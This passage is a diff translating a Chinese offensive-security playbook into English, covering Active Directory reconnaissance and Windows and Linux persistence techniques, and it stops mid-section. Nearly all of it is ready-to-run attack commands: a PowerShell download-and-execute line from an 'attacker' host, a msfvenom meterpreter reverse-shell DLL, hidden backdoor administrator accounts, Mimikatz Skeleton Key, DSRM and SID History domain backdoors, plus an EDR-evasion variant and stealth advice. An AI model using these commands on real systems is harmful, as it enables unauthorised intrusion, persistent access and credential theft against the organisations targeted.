+**3. Domain Users**  _[windows]_
+_List domain users_
 ```
 net user /domain
 ```
 
-**4. 域管理员**  _[windows]_
-_列出域管理员组_
+**4. Domain Admins**  _[windows]_
+_List the Domain Admins group_
 ```
 net group "Domain Admins" /domain
 ```
 
-**5. 域信任关系**  _[windows]_
-_列出域信任关系_
+**5. Domain Trust Relationships**  _[windows]_
+_List domain trust relationships_
 ```
 nltest /domain_trusts
 ```
 
-**6. PowerView收集**  _[windows]_
-_使用PowerView收集域信息_
+**6. PowerView Collection**  _[windows]_
+_Use PowerView to gather domain information_
 ```
 IEX(New-Object Net.WebClient).DownloadString("http://attacker/PowerView.ps1"); Get-NetDomain
 ```
 
-**7. 获取域策略**  _[windows]_
-_获取域密码策略_
+**7. Get Domain Policy**  _[windows]_
+_Get the domain password policy_
 ```
 Get-DomainPolicy
 ```
 
-**8. 获取域控制器**  _[windows]_
-_获取域控制器信息_
+**8. Get Domain Controller**  _[windows]_
+_Get domain controller information_
 ```
 Get-NetDomainController
 ```
 
-**分析：** 域信息收集是内网渗透的基础，可以了解域结构、用户、组等信息。
+**Analysis:** Domain information gathering is the foundation of internal network penetration, revealing the domain structure, users, groups, and more.
 
-**OPSEC：** 域信息收集是正常操作；不会触发明显告警；为后续攻击做准备
+**OPSEC:** Domain information gathering is a normal operation; it will not trigger obvious alerts; it prepares the ground for subsequent attacks
 
 ---
 
-### 网络信息收集  `network-recon`
-内网网络拓扑和配置信息收集
-子类：**网络信息** · tags: `network` `enumeration` `topology`
+### Network Information Gathering  `network-recon`
+Internal network topology and configuration information gathering
+Subclass: **Network Information** · tags: `network` `enumeration` `topology`
 
-**前置条件：** 内网访问权限
+**Preconditions:** internal network access
 
-**攻击链：**
+**Attack chain:**
 
-**1. 网络配置**  _[windows]_
-_查看网络配置_
+**1. Network Configuration**  _[windows]_
+_View network configuration_
 ```
 ipconfig /all
 ```
 
-**2. 路由表**  _[windows]_
-_查看路由表_
+**2. Routing Table**  _[windows]_
+_View the routing table_
 ```
 route print
 ```
 
-**3. ARP缓存**  _[windows]_
-_查看ARP缓存_
+**3. ARP Cache**  _[windows]_
+_View the ARP cache_
 ```
 arp -a
 ```
 
-**4. 网络连接**  _[windows]_
-_查看网络连接_
+**4. Network Connections**  _[windows]_
+_View network connections_
 ```
 netstat -ano
 ```
 
-**5. DNS缓存**  _[windows]_
-_查看DNS缓存_
+**5. DNS Cache**  _[windows]_
+_View the DNS cache_
 ```
 ipconfig /displaydns
 ```
 
-**6. Linux网络配置**  _[linux]_
-_Linux查看网络配置_
+**6. Linux Network Configuration**  _[linux]_
+_View network configuration on Linux_
 ```
 ifconfig -a
 ```
 
-**7. Linux路由表**  _[linux]_
-_Linux查看路由表_
+**7. Linux Routing Table**  _[linux]_
+_View the routing table on Linux_
 ```
 route -n
 ```
 
 **8. traceroute**  _[windows]_
-_追踪路由_
+_Trace the route_
 ```
 tracert target_ip
 ```
 
-**分析：** 网络信息收集可以了解内网拓扑、网段划分、网关等信息。
+**Analysis:** Network information gathering reveals internal network topology, subnet segmentation, gateway information, and more.
 
-**OPSEC：** 这些是正常的网络管理命令；不会触发告警；为后续横向移动做准备
+**OPSEC:** These are normal network management commands; they will not trigger alerts; they prepare the ground for subsequent lateral movement
 
 ---
 
-### 共享枚举  `share-enum`
-枚举网络共享资源
-子类：**共享** · tags: `smb` `share` `enumeration`
+### Share Enumeration  `share-enum`
+Enumerate network share resources
+Subclass: **Shares** · tags: `smb` `share` `enumeration`
 
-**前置条件：** 内网访问权限
+**Preconditions:** internal network access
 
-**攻击链：**
+**Attack chain:**
 
-**1. 枚举共享**  _[windows]_
-_查看本地共享_
+**1. Enumerate Shares**  _[windows]_
+_View local shares_
 ```
 net share
 ```
 
-**2. 查看远程共享**  _[windows]_
-_查看远程机器共享_
+**2. View Remote Shares**  _[windows]_
+_View shares on a remote machine_
 ```
 net view \\target_ip
 ```
 
-**3. SMBMap枚举**  _[linux]_
-_使用SMBMap枚举共享_
+**3. SMBMap Enumeration**  _[linux]_
+_Enumerate shares with SMBMap_
 ```
 smbmap -H target_ip -u user -p password
 ```
 
-**4. CrackMapExec枚举**  _[linux]_
-_使用CME枚举共享_
+**4. CrackMapExec Enumeration**  _[linux]_
+_Enumerate shares with CME_
 ```
 crackmapexec smb target_ip -u user -p password --shares
 ```
 
-**5. smbclient枚举**  _[linux]_
-_使用smbclient枚举_
+**5. smbclient Enumeration**  _[linux]_
+_Enumerate with smbclient_
 ```
 smbclient -L target_ip -U user%password
 ```
 
-**6. PowerView枚举**  _[windows]_
-_查找有趣的共享文件_
+**6. PowerView Enumeration**  _[windows]_
+_Find interesting shared files_
 ```
 Find-InterestingDomainShareFile
 ```
 
-**分析：** 共享枚举可以发现敏感文件、配置文件、备份文件等有价值的信息。
+**Analysis:** Share enumeration can uncover sensitive files, configuration files, backup files, and other valuable information.
 
-**OPSEC：** 共享枚举是正常操作；可能发现敏感文件；注意文件访问日志
+**OPSEC:** Share enumeration is a normal operation; it may surface sensitive files; be mindful of file access logs
 
 ---
 
-### 用户枚举  `user-enum`
-枚举域内用户信息
-子类：**用户** · tags: `user` `enumeration` `active-directory`
+### User Enumeration  `user-enum`
+Enumerate domain user information
+Subclass: **Users** · tags: `user` `enumeration` `active-directory`
 
-**前置条件：** 域环境；任意域用户凭证
+**Preconditions:** a domain environment; any domain user credential
 
-**攻击链：**
+**Attack chain:**
 
-**1. 列出域用户**  _[windows]_
-_列出所有域用户_
+**1. List Domain Users**  _[windows]_
+_List all domain users_
 ```
 net user /domain
 ```
 
-**2. 用户详细信息**  _[windows]_
-_查看用户详细信息_
+**2. User Details**  _[windows]_
+_View detailed user information_
 ```
 net user username /domain
 ```
 
-**3. PowerView枚举**  _[windows]_
-_使用PowerView枚举用户_
+**3. PowerView Enumeration**  _[windows]_
+_Enumerate users with PowerView_
 ```
 Get-NetUser | select samaccountname,description,admincount
 ```
 
-**4. 查找管理员**  _[windows]_
-_查找域管理员_
+**4. Find Admins**  _[windows]_
+_Find domain admins_
 ```
 Get-NetUser -AdminCount | select samaccountname
 ```
 
-**5. 查找活跃用户**  _[windows]_
-_查找最近登录的用户_
+**5. Find Active Users**  _[windows]_
+_Find recently logged-in users_
 ```
 Get-NetUser | Where-Object {$_.lastlogon -gt (Get-Date).AddDays(-30)}
 ```
 
-**6. Impacket枚举**  _[linux]_
-_使用Impacket枚举域用户_
+**6. Impacket Enumeration**  _[linux]_
+_Enumerate domain users with Impacket_
 ```
 GetADUsers.py -all domain/user:password -dc-ip dc_ip
 ```
 
-**分析：** 用户枚举可以发现高价值目标、活跃用户、服务账户等。
+**Analysis:** User enumeration can uncover high-value targets, active users, service accounts, and more.
 
-**OPSEC：** 用户枚举是正常操作；为后续攻击选择目标；注意识别蜜罐账户
+**OPSEC:** User enumeration is a normal operation; used to select targets for subsequent attacks; watch for honeypot accounts
 
 ---
 
-### 组枚举  `group-enum`
-枚举域内组信息
-子类：**组** · tags: `group` `enumeration` `active-directory`
+### Group Enumeration  `group-enum`
+Enumerate domain group information
+Subclass: **Groups** · tags: `group` `enumeration` `active-directory`
 
-**前置条件：** 域环境；任意域用户凭证
+**Preconditions:** a domain environment; any domain user credential
 
-**攻击链：**
+**Attack chain:**
 
-**1. 列出域组**  _[windows]_
-_列出所有域组_
+**1. List Domain Groups**  _[windows]_
+_List all domain groups_
 ```
 net group /domain
 ```
 
-**2. 组成员**  _[windows]_
-_查看域管理员组成员_
+**2. Group Members**  _[windows]_
+_View Domain Admins group members_
 ```
 net group "Domain Admins" /domain
 ```
 
-**3. PowerView枚举**  _[windows]_
-_使用PowerView枚举组_
+**3. PowerView Enumeration**  _[windows]_
+_Enumerate groups with PowerView_
 ```
 Get-NetGroup | select samaccountname,admincount
 ```
 
-**4. 查找高权限组**  _[windows]_
-_查找高权限组_
+**4. Find Privileged Groups**  _[windows]_
+_Find privileged groups_
 ```
 Get-NetGroup -AdminCount | select samaccountname
 ```
 
-**5. 组成员关系**  _[windows]_
-_获取组成员_
+**5. Group Membership**  _[windows]_
+_Get group members_
 ```
 Get-NetGroupMember "Domain Admins" | select membername
 ```
 
-**6. 递归组成员**  _[windows]_
-_递归获取组成员（包括嵌套组）_
+**6. Recursive Group Members**  _[windows]_
+_Recursively get group members (including nested groups)_
 ```
 Get-NetGroupMember "Domain Admins" -Recurse
 ```
 
-**分析：** 组枚举可以发现高权限组、组成员关系、嵌套组等。
+**Analysis:** Group enumeration can uncover privileged groups, group membership relationships, nested groups, and more.
 
-**OPSEC：** 组枚举是正常操作；重点关注高权限组；注意嵌套组关系
+**OPSEC:** Group enumeration is a normal operation; focus on privileged groups; watch for nested group relationships
 
 ---
 
-### GPO枚举  `gpo-enum`
-枚举组策略对象
-子类：**GPO** · tags: `gpo` `group-policy` `enumeration`
+### GPO Enumeration  `gpo-enum`
+Enumerate Group Policy Objects
+Subclass: **GPO** · tags: `gpo` `group-policy` `enumeration`
 
-**前置条件：** 域环境；任意域用户凭证
+**Preconditions:** a domain environment; any domain user credential
 
-**攻击链：**
+**Attack chain:**
 
-**1. 列出GPO**  _[windows]_
-_列出所有GPO_
+**1. List GPOs**  _[windows]_
+_List all GPOs_
 ```
 Get-GPO -All
 ```
 
-**2. PowerView枚举**  _[windows]_
-_使用PowerView枚举GPO_
+**2. PowerView Enumeration**  _[windows]_
+_Enumerate GPOs with PowerView_
 ```
 Get-NetGPO | select displayname,whencreated
 ```
 
-**3. GPO权限**  _[windows]_
-_查找GPO中的受限组_
+**3. GPO Permissions**  _[windows]_
+_Find restricted groups within GPOs_
 ```
 Get-NetGPOGroup
 ```
 
-**4. GPP密码**  _[windows]_
-_查找GPP中的密码_
+**4. GPP Passwords**  _[windows]_
+_Find passwords in GPP_
 ```
 Get-NetGPPPassword
 ```
 
-**5. 查找可利用GPO**  _[windows]_
-_查找用户受哪些GPO影响_
+**5. Find Exploitable GPOs**  _[windows]_
+_Find which GPOs affect a given user_
 ```
 Find-GPOLocation -UserName user
 ```
 
-**分析：** GPO枚举可以发现组策略配置、GPP密码、受限组等信息。
+**Analysis:** GPO enumeration can uncover Group Policy configuration, GPP passwords, restricted groups, and more.
 
-**OPSEC：** GPP密码是常见的信息泄露点；GPO可能包含敏感配置；注意GPO修改权限
+**OPSEC:** GPP passwords are a common information disclosure point; GPOs may contain sensitive configuration; watch for GPO modification permissions
 
 ---
 
-### ACL枚举  `acl-enum`
-枚举访问控制列表
-子类：**ACL** · tags: `acl` `access-control` `enumeration`
+### ACL Enumeration  `acl-enum`
+Enumerate access control lists
+Subclass: **ACL** · tags: `acl` `access-control` `enumeration`
 
-**前置条件：** 域环境；任意域用户凭证
+**Preconditions:** a domain environment; any domain user credential
 
-**攻击链：**
+**Attack chain:**
 
-**1. PowerView ACL枚举**  _[windows]_
-_获取用户对象的ACL_
+**1. PowerView ACL enumeration**  _[windows]_
+_Get the ACL of a user object_
 ```
 Get-ObjectAcl -SamAccountName user -ResolveGUIDs
 ```
 
-**2. 查找危险权限**  _[windows]_
-_查找有趣的ACL权限_
+**2. Find dangerous permissions**  _[windows]_
+_Find interesting ACL permissions_
 ```
 Find-InterestingDomainAcl -ResolveGUIDs
 ```
 
-**3. 查找WriteDACL**  _[windows]_
-_查找WriteDACL权限_
+**3. Find WriteDACL**  _[windows]_
+_Find WriteDACL permissions_
 ```
 Get-ObjectAcl -SamAccountName target -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*WriteDACL*"}
 ```
 
-**4. 查找GenericAll**  _[windows]_
-_查找GenericAll权限_
+**4. Find GenericAll**  _[windows]_
+_Find GenericAll permissions_
 ```
 Get-ObjectAcl -SamAccountName target -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*GenericAll*"}
 ```
 
-**5. BloodHound ACL分析**
-_BloodHound查询ACL关系_
+**5. BloodHound ACL analysis**
+_Query ACL relationships with BloodHound_
 ```
 MATCH (n)-[r:AllExtendedRights]->(m) RETURN n,m
 ```
 
-**分析：** ACL枚举可以发现权限配置错误，如WriteDACL、GenericAll等危险权限。
+**Analysis:** ACL enumeration can reveal permission misconfigurations, such as dangerous rights like WriteDACL and GenericAll.
 
-**OPSEC：** ACL错误配置是常见的提权路径；重点关注高价值目标；BloodHound可可视化ACL关系
+**OPSEC:** ACL misconfiguration is a common privilege escalation path; focus on high-value targets; BloodHound can visualize ACL relationships
 
 ---
 
-### 信任关系枚举  `trust-enum`
-枚举域信任关系
-子类：**信任关系** · tags: `trust` `enumeration` `active-directory`
+### Trust Relationship Enumeration  `trust-enum`
+Enumerate domain trust relationships
+Subclass: **Trust Relationships** · tags: `trust` `enumeration` `active-directory`
 
-**前置条件：** 域环境；任意域用户凭证
+**Preconditions:** a domain environment; any domain user credential
 
-**攻击链：**
+**Attack chain:**
 
-**1. 域信任关系**  _[windows]_
-_列出域信任关系_
+**1. Domain trust relationships**  _[windows]_
+_List domain trust relationships_
 ```
 nltest /domain_trusts
 ```
 
-**2. PowerView枚举**  _[windows]_
-_使用PowerView枚举信任关系_
+**2. PowerView enumeration**  _[windows]_
+_Enumerate trust relationships with PowerView_
 ```
 Get-NetDomainTrust
 ```
 
-**3. 森林信任**  _[windows]_
-_枚举森林信任关系_
+**3. Forest trust**  _[windows]_
+_Enumerate forest trust relationships_
 ```
 Get-NetForestTrust
 ```
 
-**4. 信任详细信息**  _[windows]_
-_查看信任详细信息_
+**4. Trust details**  _[windows]_
+_View trust relationship details_
 ```
 Get-NetDomainTrust | select SourceDomain,TargetDomain,TrustType,TrustDirection
 ```
 
-**分析：** 信任关系枚举可以发现跨域/跨森林攻击路径。
+**Analysis:** Trust relationship enumeration can reveal cross-domain/cross-forest attack paths.
 
-**OPSEC：** 信任关系可能提供跨域攻击路径；关注双向信任；注意SID历史问题
+**OPSEC:** Trust relationships may provide cross-domain attack paths; focus on bidirectional trusts; watch for SID history issues
 
 ---
 
-### 计算机枚举  `computer-enum`
-枚举域内计算机
-子类：**计算机** · tags: `computer` `enumeration` `active-directory`
+### Computer Enumeration  `computer-enum`
+Enumerate computers in the domain
+Subclass: **Computers** · tags: `computer` `enumeration` `active-directory`
 
-**前置条件：** 域环境；任意域用户凭证
+**Preconditions:** a domain environment; any domain user credential
 
-**攻击链：**
+**Attack chain:**
 
-**1. 列出域计算机**  _[windows]_
-_列出域计算机_
+**1. List domain computers**  _[windows]_
+_List domain computers_
 ```
 net group "Domain Computers" /domain
 ```
 
-**2. PowerView枚举**  _[windows]_
-_使用PowerView枚举计算机_
+**2. PowerView enumeration**  _[windows]_
+_Enumerate computers with PowerView_
 ```
 Get-NetComputer | select name,operatingsystem,ipv4address
 ```
 
-**3. 查找域控制器**  _[windows]_
-_查找域控制器_
+**3. Find domain controllers**  _[windows]_
+_Find domain controllers_
 ```
 Get-NetComputer -DomainController
 ```
 
-**4. 查找特定系统**  _[windows]_
-_查找特定操作系统_
+**4. Find specific systems**  _[windows]_
+_Find a specific operating system_
 ```
 Get-NetComputer -OperatingSystem "*Server 2019*"
 ```
 
-**5. 查找活跃计算机**  _[windows]_
-_查找在线计算机_
+**5. Find active computers**  _[windows]_
+_Find computers that are online_
 ```
 Get-NetComputer -Ping
 ```
 
-**6. 查找管理员会话**  _[windows]_
-_查找域管理员登录位置_
+**6. Find administrator sessions**  _[windows]_
+_Find where domain admins are logged in_
 ```
 Find-DomainUserLocation
 ```
 
-**分析：** 计算机枚举可以发现域内所有计算机，识别高价值目标。
+**Analysis:** Computer enumeration can reveal all computers in the domain and help identify high-value targets.
 
-**OPSEC：** 计算机枚举是正常操作；重点关注域控制器和服务器；查找管理员会话
+**OPSEC:** Computer enumeration is a normal operation; focus on domain controllers and servers; look for administrator sessions
 
 ---
 
-## 权限维持
+## Persistence
 
-### 注册表持久化  `persistence-registry`
-通过注册表实现权限维持
-子类：**注册表** · tags: `persistence` `registry` `windows` `autorun`
+### Registry Persistence  `persistence-registry`
+Achieve persistence via the registry
+Subclass: **Registry** · tags: `persistence` `registry` `windows` `autorun`
 
-**前置条件：** 已获得目标机器权限；管理员权限；Windows系统
+**Preconditions:** already have access to the target machine; administrator privileges; Windows system
 
-**攻击链：**
+**Attack chain:**
 
-**1. Run键持久化**  _[windows]_
-_添加Run键实现开机自启_
+**1. Run key persistence**  _[windows]_
+_Add a Run key for startup execution_
 ```
 reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f
 ```
 
-**2. RunOnce键**  _[windows]_
-_RunOnce键，执行一次后删除_
+**2. RunOnce key**  _[windows]_
+_RunOnce key, deleted after a single execution_
 ```
 reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
 ```
 
 **3. Winlogon Helper**  _[windows]_
-_修改Userinit实现持久化_
+_Modify Userinit for persistence_
 ```
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\backdoor.exe" /f
 ```
 
-**4. 服务持久化**  _[windows]_
-_创建服务实现持久化_
+**4. Service persistence**  _[windows]_
+_Create a service for persistence_
 ```
 sc create Backdoor binPath= "C:\backdoor.exe" start= auto
 ```
 
-**EDR 绕过变体：**
+**EDR bypass variants:**
 
-**1. 隐藏注册表键**
-_使用空字节隐藏注册表键_
+**1. Hide the registry key**
+_Use a null byte to hide the registry key_
 ```
 reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\x00" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
 ```
 
-**分析：** 注册表持久化会在系统启动或用户登录时执行恶意程序。
+**Analysis:** Registry persistence executes a malicious program at system startup or user logon.
 
-**OPSEC：** Run键是最常见的持久化方式，容易被检测；考虑使用更隐蔽的方式；定期检查注册表异常项
+**OPSEC:** the Run key is the most common persistence method and is easily detected; consider stealthier methods; regularly check for abnormal registry entries
 
 ---
 
-### WMI持久化  `persistence-wmi`
-通过WMI事件订阅实现持久化
-子类：**WMI** · tags: `wmi` `persistence` `windows`
+### WMI Persistence  `persistence-wmi`
+Achieve persistence via WMI event subscription
+Subclass: **WMI** · tags: `wmi` `persistence` `windows`
 
-**前置条件：** 管理员权限
+**Preconditions:** administrator privileges
 
-**攻击链：**
+**Attack chain:**
 
-**1. 创建事件过滤器**  _[windows]_
-_创建WMI事件过滤器_
+**1. Create an event filter**  _[windows]_
+_Create a WMI event filter_
 ```
 $filter = New-WmiEventFilter -Name "evil" -Query "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
 ```
 
-**2. 创建事件消费者**  _[windows]_
-_创建命令行消费者_
+**2. Create an event consumer**  _[windows]_
+_Create a command-line consumer_
 ```
 $consumer = New-WmiEventConsumer -Name "evil" -CommandLineTemplate "powershell -e BASE64_CMD"
 ```
 
-**3. 绑定过滤器和消费者**  _[windows]_
-_绑定触发执行_
+**3. Bind filter and consumer**  _[windows]_
+_Bind to trigger execution_
 ```
 New-WmiFilterToConsumerBinding -Filter $filter -Consumer $consumer
 ```
 
 ---
 
-### 启动文件夹持久化  `persistence-startup`
-通过启动文件夹实现持久化
-子类：**启动文件夹** · tags: `startup` `persistence` `windows`
+### Startup Folder Persistence  `persistence-startup`
+Achieve persistence via the startup folder
+Subclass: **Startup Folder** · tags: `startup` `persistence` `windows`
 
-**前置条件：** 写入权限
+**Preconditions:** write permission
 
-**攻击链：**
+**Attack chain:**
 
-**1. 当前用户启动文件夹**  _[windows]_
-_当前用户启动_
+**1. Current user startup folder**  _[windows]_
+_Current user startup_
 ```
 copy evil.lnk "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 ```
 
-**2. 所有用户启动文件夹**  _[windows]_
-_所有用户启动_
+**2. All users startup folder**  _[windows]_
+_All users startup_
 ```
 copy evil.lnk "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
 ```
 
 ---
 
-### 服务持久化  `persistence-service`
-通过创建服务实现持久化
-子类：**服务** · tags: `service` `persistence` `windows`
+### Service Persistence  `persistence-service`
+Achieve persistence by creating a service
+Subclass: **Service** · tags: `service` `persistence` `windows`
 
-**前置条件：** 管理员权限
+**Preconditions:** administrator privileges
 
-**攻击链：**
+**Attack chain:**
 
-**1. 创建服务**  _[windows]_
-_创建自启动服务_
+**1. Create a service**  _[windows]_
+_Create an auto-start service_
 ```
 sc create evilsvc binPath= "cmd /c powershell -e BASE64_CMD" start= auto
 ```
 
-**2. 启动服务**  _[windows]_
-_启动服务_
+**2. Start the service**  _[windows]_
+_Start the service_
 ```
 sc start evilsvc
 ```
 
 ---
 
-### DLL注入持久化  `persistence-dll-injection`
-通过DLL注入实现持久化
-子类：**DLL注入** · tags: `dll` `injection` `persistence`
+### DLL Injection Persistence  `persistence-dll-injection`
+Achieve persistence via DLL injection
+Subclass: **DLL Injection** · tags: `dll` `injection` `persistence`
 
-**前置条件：** 代码执行权限；目标进程
+**Preconditions:** code execution; target process
 
-**攻击链：**
+**Attack chain:**
 
-**1. 创建恶意DLL**  _[linux]_
-_生成恶意DLL_
+**1. Create a malicious DLL**  _[linux]_
+_Generate a malicious DLL_
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll > evil.dll
 ```
 
-**2. 注入DLL**  _[windows]_
-_将DLL注入到运行进程_
+**2. Inject the DLL**  _[windows]_
+_Inject the DLL into a running process_
 ```
-使用工具如InjectDLL、PowerShell等注入到目标进程
+Use a tool such as InjectDLL, PowerShell, etc. to inject into the target process
 ```
 
 **3. AppInit_DLLs**  _[windows]_
-_通过AppInit_DLLs注入_
+_Inject via AppInit_DLLs_
 ```
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\evil.dll" /f
 ```
 
 ---
 
-### 后门用户  `persistence-backdoor-user`
-创建后门用户账户
-子类：**用户** · tags: `user` `backdoor` `persistence`
+### Backdoor User  `persistence-backdoor-user`
+Create a backdoor user account
+Subclass: **User** · tags: `user` `backdoor` `persistence`
 
-**前置条件：** 管理员权限
+**Preconditions:** administrator privileges
 
-**攻击链：**
+**Attack chain:**
 
-**1. 创建用户**  _[windows]_
-_创建管理员用户_
+**1. Create a user**  _[windows]_
+_Create an administrator user_
 ```
 net user backdoor P@ssw0rd /add
 net localgroup administrators backdoor /add
 ```
 
-**2. 隐藏用户**  _[windows]_
-_创建隐藏用户（$结尾）_
+**2. Hide the user**  _[windows]_
+_Create a hidden user (ending in $)_
 ```
 net user backdoor$ P@ssw0rd /add
 ```
 
-**3. 修改注册表隐藏**  _[windows]_
-_通过注册表隐藏用户_
+**3. Hide via registry modification**  _[windows]_
+_Hide the user via the registry_
 ```
 reg add "HKLM\SAM\SAM\Domains\Account\Users\Names\backdoor$" /f
 ```
 
 ---
 
-### 隐藏用户  `persistence-hidden-user`
-创建隐藏的管理员用户
-子类：**隐藏用户** · tags: `hidden` `user` `persistence`
+### Hidden User  `persistence-hidden-user`
+Create a hidden administrator user
+Subclass: **Hidden User** · tags: `hidden` `user` `persistence`
 
-**前置条件：** SYSTEM权限
+**Preconditions:** SYSTEM privileges
 
-**攻击链：**
+**Attack chain:**
 
-**1. 创建用户**  _[windows]_
-_创建$结尾用户_
+**1. Create a user**  _[windows]_
+_Create a user ending in $_
 ```
 net user hidden$ P@ssw0rd /add
 ```
 
-**2. 添加到管理员组**  _[windows]_
-_添加管理员权限_
+**2. Add to the administrators group**  _[windows]_
+_Add administrator privileges_
 ```
 net localgroup administrators hidden$ /add
 ```
 
-**3. 注册表隐藏**  _[windows]_
-_通过注册表完全隐藏_
+**3. Hide via registry**  _[windows]_
+_Fully hide via the registry_
 ```
 reg export "HKLM\SAM\SAM\Domains\Account\Users\000003E9" user.reg
-修改F值
+Modify the F value
 reg import user.reg
 ```
 
 ---
 
-### 计划任务持久化  `persistence-scheduled`
-通过计划任务实现持久化
-子类：**计划任务** · tags: `persistence` `scheduled` `task`
+### Scheduled Task Persistence  `persistence-scheduled`
+Achieve persistence via scheduled tasks
+Subclass: **Scheduled Task** · tags: `persistence` `scheduled` `task`
 
-**前置条件：** 创建任务权限
+**Preconditions:** permission to create tasks
 
-**攻击链：**
+**Attack chain:**
 
-**1. 创建登录任务**  _[windows]_
-_创建登录时运行的任务_
+**1. Create a logon task**  _[windows]_
+_Create a task that runs at logon_
 ```
 schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc onlogon /ru SYSTEM
 ```
 
-**2. 创建定时任务**  _[windows]_
-_创建每5分钟运行的任务_
+**2. Create a timed task**  _[windows]_
+_Create a task that runs every 5 minutes_
 ```
 schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc minute /mo 5
 ```
 
-**3. PowerShell创建**  _[windows]_
-_使用PowerShell创建任务_
+**3. Create via PowerShell**  _[windows]_
+_Create a task with PowerShell_
 ```
 $action = New-ScheduledTaskAction -Execute "C:\backdoor.exe"
 $trigger = New-ScheduledTaskTrigger -AtLogon
@@ -4250,66 +4250,66 @@ Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Backdoor" -U
 ```
 
 **4. Linux Cron**  _[linux]_
-_Linux计划任务_
+_Linux scheduled task_
 ```
 crontab -e
-添加: * * * * * /tmp/backdoor.sh
-或: @reboot /tmp/backdoor.sh
+Add: * * * * * /tmp/backdoor.sh
+or: @reboot /tmp/backdoor.sh
 ```
 
 ---
 
-### Skeleton Key后门  `skeleton-key`
-在域控制器植入万能密码
-子类：**域后门** · tags: `skeleton-key` `backdoor` `domain`
+### Skeleton Key Backdoor  `skeleton-key`
+Implant a master password on the domain controller
+Subclass: **Domain Backdoor** · tags: `skeleton-key` `backdoor` `domain`
 
-**前置条件：** 域管理员权限；访问域控制器
+**Preconditions:** domain admin privileges; access to a domain controller
 
-**攻击链：**
+**Attack chain:**
 
-**1. 植入Skeleton Key**  _[windows]_
-_使用Mimikatz植入_
+**1. Implant the Skeleton Key**  _[windows]_
+_Implant using Mimikatz_
 ```
 mimikatz # privilege::debug
 mimikatz # misc::skeleton
 ```
 
-**2. 使用万能密码**  _[windows]_
-_使用万能密码登录_
+**2. Use the master password**  _[windows]_
+_Log in using the master password_
 ```
-万能密码: mimikatz
-任何域用户都可以使用mimikatz作为密码登录
+Master password: mimikatz
+Any domain user can log in using "mimikatz" as the password
 ```
 
-**3. 检测方法**  _[windows]_
-_检测Skeleton Key_
+**3. Detection method**  _[windows]_
+_Detect the Skeleton Key_
 ```
-检查LSASS内存:
+Check LSASS memory:
 Get-Process lsass
-使用EDR检测内存注入
+Use EDR to detect memory injection
 ```
 
 ---
 
-### DSRM后门  `dsrm-backdoor`
-利用DSRM账户建立后门
-子类：**域后门** · tags: `dsrm` `backdoor` `domain`
+### DSRM Backdoor  `dsrm-backdoor`
+Establish a backdoor using the DSRM account
+Subclass: **Domain Backdoor** · tags: `dsrm` `backdoor` `domain`
 
-**前置条件：** 域管理员权限；访问域控制器
+**Preconditions:** domain admin privileges; access to a domain controller
 
-**攻击链：**
+**Attack chain:**
 
-**1. 获取DSRM密码**  _[windows]_
-_获取DSRM账户哈希_
+**1. Obtain the DSRM password**  _[windows]_
+_Obtain the DSRM account hash_
 ```
 mimikatz # lsadump::lsa /patch /name:krbtgt
-或
+or
 mimikatz # token::elevate
 mimikatz # lsadump::sam
 ```
 
-**2. 同步DSRM密码**  _[windows]_
-_同步DSRM密码与域管理员_
+**2. Sync the DSRM password**  _[windows]_
+_Sync the DSRM password with the domain admin_
 ```
 ntdsutil
 set dsrm password
@@ -4318,516 +4318,516 @@ q
 q
 ```
 
-**3. 启用DSRM账户**  _[windows]_
-_允许DSRM账户远程登录_
+**3. Enable the DSRM account**  _[windows]_
+_Allow the DSRM account to log on remotely_
 ```
-修改注册表:
+Modify the registry:
 New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
 ```
 
-**4. 使用DSRM登录**  _[windows]_
-_使用DSRM账户_
+**4. Log in with DSRM**  _[windows]_
+_Use the DSRM account_
 ```
-使用DSRM账户哈希:
+Use the DSRM account hash:
 mimikatz # sekurlsa::pth /domain:DC_NAME /user:Administrator /ntlm:HASH
-或使用Pass-the-Hash
+or use Pass-the-Hash
 ```
 
 ---
 
-### SID History后门  `sid-history`
-利用SID History建立后门
-子类：**域后门** · tags: `sid-history` `backdoor` `domain`
+### SID History Backdoor  `sid-history`
+Establish a backdoor using SID History
+Subclass: **Domain Backdoor** · tags: `sid-history` `backdoor` `domain`
 
-**前置条件：** 域管理员权限
+**Preconditions:** Domain administrator privileges
 
-**攻击链：**
+**Attack chain:**
 
-**1. 添加SID History**  _[windows]_
-_添加SID History_
+**1. Add SID History**  _[windows]_
+_Add SID History_
 ```
 mimikatz # sid::add /sam:backdoor_user /new:administrator
-将域管SID添加到普通用户
+Add the domain admin SID to a regular user
 ```
 
-**2. 验证SID History**  _[windows]_
-_检查SID History_
+**2. Verify SID History**  _[windows]_
+_Check SID History_
 ```
 Get-ADUser backdoor_user -Properties sidHistory
-或
+or
 whoami /all
 ```
 
-**3. 使用后门**  _[windows]_
-_使用后门账户_
+**3. Use the backdoor**  _[windows]_
+_Use the backdoor account_
 ```
-使用backdoor_user登录
-自动获得域管理员权限
+Log in as backdoor_user
+Automatically obtain domain administrator privileges
 ```
 
 ---
 
-### 进程镂空持久化  `persistence-process-hollowing`
-利用进程镂空技术实现持久化
-子类：**进程注入** · tags: `process-hollowing` `persistence` `injection`
+### Process Hollowing Persistence  `persistence-process-hollowing`
+Achieve persistence using process hollowing techniques
